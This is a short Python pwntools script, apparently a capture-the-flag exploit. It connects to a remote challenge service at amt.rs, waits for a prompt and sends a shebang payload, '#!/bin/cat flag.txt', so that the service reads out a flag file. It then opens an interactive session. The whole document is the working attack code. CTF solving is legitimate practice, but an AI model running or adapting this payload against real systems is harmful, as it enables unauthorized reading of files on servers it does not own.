from pwn import *

elf_cons = b"#!/bin/cat flag.txt"

io = remote("amt.rs", 31178)
#gdb.attach(io, api=True)
io.recvuntil(b'fun!\n')
io.send(elf_cons)
io.interactive()